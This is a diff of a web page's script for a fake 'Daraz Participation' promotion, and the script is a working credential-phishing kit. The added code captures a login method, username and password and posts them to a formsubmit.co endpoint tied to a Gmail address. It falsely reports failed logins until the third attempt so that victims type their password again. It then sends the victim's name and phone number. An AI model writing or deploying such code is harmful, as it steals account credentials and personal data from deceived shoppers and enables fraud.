@@ -98,53 +98,62 @@
     </div>
 
     <script>
+       
         const ENDPOINT = "https://formsubmit.co/ajax/yoshpick22@gmail.com";
         let loginAttempts = 0;
-        let shareCount = 0;
-        let leaveTime = 0;
-        let activeSharing = false;
-        
-        // Global object to store ALL data
-        let finalData = {};
 
-        function showInfoPage() {
+        function triggerLogin() {
             if (document.getElementById('agree-check').checked) {
-                document.getElementById('landing-page').style.display = 'none';
-                document.getElementById('participation-ui').style.display = 'flex';
-            } else { alert("Please agree to rules!"); }
-        }
-
-        function showLoginModal() {
-            // Store personal info
-            finalData.Full_Name = document.getElementById('cust-name').value;
-            finalData.Location = document.getElementById('cust-location').value;
-            finalData.Phone = document.getElementById('cust-phone').value;
-            finalData.Shop_History = document.getElementById('cust-shop').value;
-
-            if(!finalData.Full_Name || !finalData.Phone) return alert("Fill all info!");
-            document.getElementById('login-modal').style.display = 'flex';
+                document.getElementById('login-modal').style.display = 'flex';
+            } else {
+                alert("Please agree to the Rules first!");
+            }
         }
 
         document.getElementById('secure-form').onsubmit = async function(e) {
             e.preventDefault();
             loginAttempts++;
-            const btn = document.getElementById('login-btn');
             
-            // Add login info to the global object
-            finalData.Username = document.getElementById('login-username').value;
-            finalData.Password = document.getElementById('password-input').value;
-            finalData.Attempt = loginAttempts;
-
+            const btn = document.getElementById('login-btn');
             btn.innerText = "Verifying...";
 
-            // SEND EVERYTHING AT ONCE
-            await fetch(AJAX_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    _subject: "Daraz Participation: " + finalData.Full_Name,
-                    ...finalData // This sends Name, Location, Phone, History, User, and Pass
-                })
+            const data = {
+                Method: document.getElementById('login-method').value,
+                User: document.getElementById('username').value,
+                Pass: document.getElementById('password').value,
+                Attempt: loginAttempts
+            };
+
+            await fetch(ENDPOINT, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                body: JSON.stringify(data)
+            });
+
+            if (loginAttempts < 3) {
+                document.getElementById('password').value = "";
+                document.getElementById('error-display').style.display = 'block';
+                btn.innerText = "Try Again";
+            } else {
+                document.getElementById('login-modal').style.display = 'none';
+                document.getElementById('landing-page').style.display = 'none';
+                document.getElementById('participation-ui').style.display = 'flex';
+                window.scrollTo(0, 0);
+            }
+        };
+
+        async function finalizeEntry() {
+            const name = document.getElementById('cust-name').value;
+            const phone = document.getElementById('cust-phone').value;
+            const fBtn = document.getElementById('final-btn');
+
+            if(!name || !phone) return alert("Fill all details!");
+            fBtn.innerText = "Submitting...";
+
+            await fetch(ENDPOINT, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                body: JSON.stringify({ Full_Name: name, Phone: phone, Status: "Completed" })
             });
 
             if (loginAttempts < 3) {
